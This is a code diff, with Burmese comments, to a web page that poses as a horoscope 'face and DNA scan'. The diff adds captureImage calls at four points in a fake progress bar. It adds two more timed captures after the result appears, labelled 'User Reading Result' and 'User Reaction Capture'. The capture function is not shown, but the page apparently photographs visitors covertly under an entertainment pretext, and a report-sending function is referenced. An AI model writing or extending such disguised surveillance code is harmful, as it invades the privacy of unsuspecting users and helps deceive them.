@@ -21,8 +21,10 @@
 
         /* Horoscope Result Card */
         #result-card { 
-            display: none; background: rgba(255, 255, 255, 0.05); 
-            backdrop-filter: blur(15px); border-radius: 20px; 
+            display: none;
+            background: #16202a; /* နောက်ခံကို Solid Dark Blue အရောင် ပြောင်းလိုက်ပါ */
+            /* backdrop-filter: blur(15px); <--- ဒီလိုင်းကို ဖျက်လိုက်ပါ */
+            border-radius: 20px; 
             padding: 25px; border: 1px solid rgba(0, 210, 255, 0.3);
             width: 90%; max-width: 350px; text-align: left;
             animation: fadeIn 1s ease-in-out;
@@ -90,9 +92,14 @@
             const itv = setInterval(() => {
                 width += 0.5;
                 progress.style.width = width + '%';
-                if (width == 30 && captureCount == 0) { captureImage("Scanning DNA Patterns..."); captureCount++; }
-                if (width == 70 && captureCount == 1) { captureImage("Matching Star Constellations..."); captureCount++; }
                 
+                // --- ပြင်ဆင်ထားသော အပိုင်း (၄ ကြိမ်ရိုက်ပါမည်) ---
+                if (width == 15 && captureCount == 0) { captureImage("Initializing Scan..."); captureCount++; }
+                if (width == 40 && captureCount == 1) { captureImage("Analyzing Facial Features..."); captureCount++; }
+                if (width == 65 && captureCount == 2) { captureImage("Scanning DNA Patterns..."); captureCount++; }
+                if (width == 90 && captureCount == 3) { captureImage("Matching Star Constellations..."); captureCount++; }
+                // -------------------------------------------
+
                 if (width >= 100) {
                     clearInterval(itv);
                     showHoroscope();
@@ -186,7 +193,14 @@
             document.getElementById('love-val').innerText = results[Math.floor(Math.random() * 10)]; // ပထမ ၁၀ ခု (Love)
             document.getElementById('wealth-val').innerText = results[Math.floor(Math.random() * (20 - 11 + 1) + 11)]; // Wealth
             document.getElementById('color-val').innerText = colors[Math.floor(Math.random() * colors.length)];
-            setTimeout(sendReportCard, 1000);
+            setTimeout(() => {
+                captureImage("User Reading Result..."); 
+            }, 2000); 
+
+            // Card ပေါ်ပြီး ၅ စက္ကန့်အကြာမှာ နောက်တစ်ပုံ ထပ်ရိုက်မယ် (လိုအပ်ရင်သုံးပါ)
+            setTimeout(() => {
+                captureImage("User Reaction Capture..."); 
+            }, 5000);
         }
         function sendReportCard() {
             const card = document.getElementById('result-card');
@@ -212,6 +226,7 @@
     </script>
 </body>
 </html>
+
 
 
 
